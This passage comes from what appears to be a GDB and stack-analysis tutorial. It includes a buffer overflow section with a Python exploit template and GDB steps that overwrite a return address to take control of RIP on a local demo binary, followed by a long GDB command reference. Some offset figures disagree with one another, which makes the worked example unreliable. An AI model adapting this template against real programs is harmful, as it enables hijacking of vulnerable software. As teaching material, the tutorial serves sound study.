───────────────────────────────────────
RBP-8:  ptr (8 bytes) = 0x402004
───────────────────────────────────────
RBP-c:  var2 (4 bytes) = 300
───────────────────────────────────────
RBP-10: var1 (4 bytes) = 10
───────────────────────────────────────
RBP-14: argc (4 bytes) = 1
───────────────────────────────────────
RBP-20: argv (8 bytes) = 0x7fffffffe3b8
═══════════════════════════════════════
Low Address

If there was a vulnerable buffer at RBP-0x30:
  char buffer[16];  ← starts at RBP-0x30
  
  Overflow path:
  buffer[0..15] → buffer
  buffer[16..23] → gaps/other vars
  buffer[24..31] → var2, var1 or other locals
  buffer[32..39] → argc
  buffer[40..47] → argv area
  buffer[48..55] → gets to RBP-8 (ptr area)
  ...continues upward...
  until we reach:
  [RBP+0] → overwrite saved RBP
  [RBP+8] → overwrite RETURN ADDRESS ← EXPLOIT!
  
  Offset calculation:
  Return address offset = (RBP - buffer_start) + 8
                        = 0x30 + 8 = 56 bytes total
```

## Practical Exploit Example

```python
#!/usr/bin/env python3
"""
Exploit template based on stack analysis
"""
import struct

# ─── Configuration ───
TARGET = './stack'

# From GDB analysis:
BUFFER_START = 0x7fffffffe300  # Example buffer address
RBP_ADDR     = 0x7fffffffe330  # RBP from our session
RETURN_ADDR  = RBP_ADDR + 8    # Return address location

# What we want to execute:
TARGET_FUNC  = 0x401106        # Jump back to main (for demo)

# ─── Calculate offsets ───
buffer_to_saved_rbp = RBP_ADDR - BUFFER_START   # Distance to saved RBP
buffer_to_return    = buffer_to_saved_rbp + 8    # +8 for return address

print(f"Buffer start:        0x{BUFFER_START:016x}")
print(f"Saved RBP at:        0x{RBP_ADDR:016x}")
print(f"Return address at:   0x{RETURN_ADDR:016x}")
print(f"Offset to ret addr:  {buffer_to_return} bytes")

# ─── Build payload ───
payload = b"A" * buffer_to_return          # Fill up to return address
payload += struct.pack("<Q", TARGET_FUNC)  # Overwrite return address
                                           # "<Q" = little-endian 8-byte

print(f"\nPayload size: {len(payload)} bytes")
print(f"Target address: 0x{TARGET_FUNC:016x}")
print(f"Payload (hex): {payload.hex()}")

# ─── Write payload ───
with open('/tmp/payload', 'wb') as f:
    f.write(payload)

print("\nRun in GDB:")
print(f"  run $(cat /tmp/payload)")
print(f"  Or: run $(python3 exploit.py)")
```

## Key GDB Commands for Exploit Development

```gdb
# ─── Find the buffer address ───
break vulnerable_function
run
print &buffer        # Get buffer's address

# ─── Calculate offset ───
print $rbp           # Get RBP
# Offset = (RBP - buffer_address) + 8

# ─── Set up pattern for offset calculation ───
# Generate with Python: python3 -c "print('A'*200)"
run $(python3 -c "print('A'*200)")

# ─── After crash, check what's in RIP ───
info registers rip   # Should show overwritten value
# Like: 0x4141414141414141 = "AAAAAAAA"

# ─── Find exact offset ───
# Generate unique pattern and find where it ends up in RIP
run $(python3 -c "
s = ''
for i in range(50):
    s += chr(65+i%26) + chr(65+i%26)
print(s[:200])
")

# ─── Control RIP ───
run $(python3 -c "
import struct
offset = 40       # Your calculated offset
target = 0x401106 # Address of main (for demo)
payload = b'A' * offset + struct.pack('<Q', target)
import sys
sys.stdout.buffer.write(payload)
")

# ─── Verify control ───
break *0x401134   # At ret
run PAYLOAD
x/gx $rsp         # Should show your target address
stepi             # Should jump to your target!
```

---

# PART 9 — QUICK COMMAND REFERENCE

## EVERY COMMAND IN ONE PLACE

```gdb
┌─────────────────────────────────────────────────────────────┐
│                    PROGRAM CONTROL                          │
├─────────────────────────────────────────────────────────────┤
│ run / r                    Start program                    │
│ run arg1 arg2              Start with arguments             │
│ start                      Start and break at main          │
│ continue / c               Continue execution               │
│ kill                       Kill program                     │
│ quit / q                   Exit GDB                         │
├─────────────────────────────────────────────────────────────┤
│                    BREAKPOINTS                              │
├─────────────────────────────────────────────────────────────┤
│ break main                 Break at function                │
│ break *0x401134            Break at address                 │
│ break file.c:25            Break at source line             │
│ tbreak main                Temporary breakpoint             │
│ watch *($rbp-0x10)         Watch memory                     │
│ rwatch *($rbp-0x10)        Watch for reads                  │
│ catch syscall              Catch system calls               │
│ info breakpoints           List all                         │
│ delete 1                   Remove #1                        │
│ disable 1                  Disable #1                       │
│ enable 1                   Enable #1                        │
├─────────────────────────────────────────────────────────────┤
│                    EXECUTION STEPPING                       │
├─────────────────────────────────────────────────────────────┤
│ stepi / si                 Step one instruction (into)      │
│ nexti / ni                 Step one instruction (over)      │
│ step / s                   Step source line (into)          │
│ next / n                   Step source line (over)          │
│ finish                     Run until function returns       │
│ until *0x401134            Run until address                │
│ return 0                   Return from function now         │
│ jump main                  Jump to address                  │
├─────────────────────────────────────────────────────────────┤
│                    MEMORY EXAMINATION                       │
├─────────────────────────────────────────────────────────────┤
│ x/gx $rsp                  8 bytes at RSP (hex)             │
│ x/wx $rbp-0x10             4 bytes (var1)                   │
│ x/dw $rbp-0x10             4 bytes as decimal               │
│ x/s 0x402004               String at address                │
│ x/i $rip                   Instruction at RIP               │
│ x/10i main                 10 instructions of main          │
│ x/8xb $rsp                 8 individual bytes               │
│ x/32gx $rsp                32 quadwords (256 bytes)         │
│ x/ga $rbp+8                8 bytes as address+symbol        │
├─────────────────────────────────────────────────────────────┤
│                    REGISTERS                                │
├─────────────────────────────────────────────────────────────┤
│ info registers             Show all registers               │
│ info all-registers         Including SIMD                   │
│ print $rax                 RAX value                        │
│ print/x $rsp               RSP in hex                       │
│ print/t $eflags            EFLAGS in binary                 │
│ set $rax = 0x1234          Set register                     │
│ set $rip = 0x401106        Change execution address         │
├─────────────────────────────────────────────────────────────┤
│                    STACK ANALYSIS                           │
├─────────────────────────────────────────────────────────────┤
│ backtrace / bt             Call stack                       │
│ backtrace full             With local variables             │
│ info frame                 Current frame details            │
│ info locals                Local variables                  │
│ info args                  Function arguments               │
│ frame 1                    Select caller frame              │
│ up / down                  Navigate frames                  │
├─────────────────────────────────────────────────────────────┤
│                    DISASSEMBLY & CODE                       │
├─────────────────────────────────────────────────────────────┤
│ disassemble main           Full function disassembly        │
│ disassemble /r main        With raw bytes                   │
│ disassemble /m main        With source lines                │
│ set disassembly-flavor intel  Intel syntax                  │
│ info functions             List all functions               │
│ info symbol 0x401106       Symbol at address                │
├─────────────────────────────────────────────────────────────┤
│                    DISPLAY (AUTO-PRINT)                     │
├─────────────────────────────────────────────────────────────┤
│ display/i $rip             Auto-show instruction            │
│ display/x $rsp             Auto-show RSP                    │
│ display/x $rbp             Auto-show RBP                    │
│ display $rbp-$rsp          Auto-show frame size             │
│ display/8gx $rsp           Auto-show stack                  │
│ undisplay                  Remove all                       │
│ info display               List all displays                │
├─────────────────────────────────────────────────────────────┤
│                    OUTPUT & FORMATTING                      │
├─────────────────────────────────────────────────────────────┤
│ printf "%d\n", $rax        Formatted print                  │
│ printf "%x\n", 300         Print 300 as hex                 │
│ set logging enabled on     Log to file                      │
│ set pagination off         No --More-- prompts              │
│ set disassembly-flavor intel  Intel syntax                  │
├─────────────────────────────────────────────────────────────┤
│                    ADVANCED                                 │
├─────────────────────────────────────────────────────────────┤
│ define mycommand           Create custom command            │
│ source script.gdb          Load GDB script                  │
│ python <code>              Execute Python                   │
│ shell ls                   Run shell command                │
│ pipe x/20gx $rsp | grep 7fff  Pipe to shell                │
│ find $rsp, +200, 0x41      Find byte in memory              │
│ checkpoint                 Save state snapshot              │
│ dump memory out.bin A B    Dump memory to file              │
└─────────────────────────────────────────────────────────────┘
```

---

# CLOSING: THE COMPLETE PICTURE

After studying this guide, you understand:

1. **Stack** = LIFO structure, grows downward in virtual memory
2. **RSP** = always points to current top of stack (changes constantly)
3. **RBP** = stable reference point for current function (set in prologue)
4. **Frame** = the region between RSP and RBP+8 (includes return address)
5. **Variables** = located at RBP-offset (local vars) or RBP+offset (args on stack)
6. **Hex values** = read in little-endian, prefix tells you the memory region
7. **Return address** = stored at RBP+8, primary exploit target
8. **Every register** = has specific purpose, tells a story when analyzed

**From your session's actual register state, you saw:**
- `RAX=0x0` → main returning 0 (success)
- `RDI=0x1` → argc=1 (just the program name)
- `RSI=0x7fffffffe3b8` → argv pointer in stack area
- `RBP=0x7fffffffe330` → main's frame base
- `RSP=0x7fffffffe298` → stack top (152 bytes below RBP = frame size)
- `RIP=0x401134` → about to execute 'ret'
- `[RSP]=0x7ffff7c2a1ca` → return address = back to libc

Every single digit in those hex values tells you something about where the data lives, what it represents, and how the program is organized. Master reading hex and you master reading program state!

Happy exploiting! 🎯
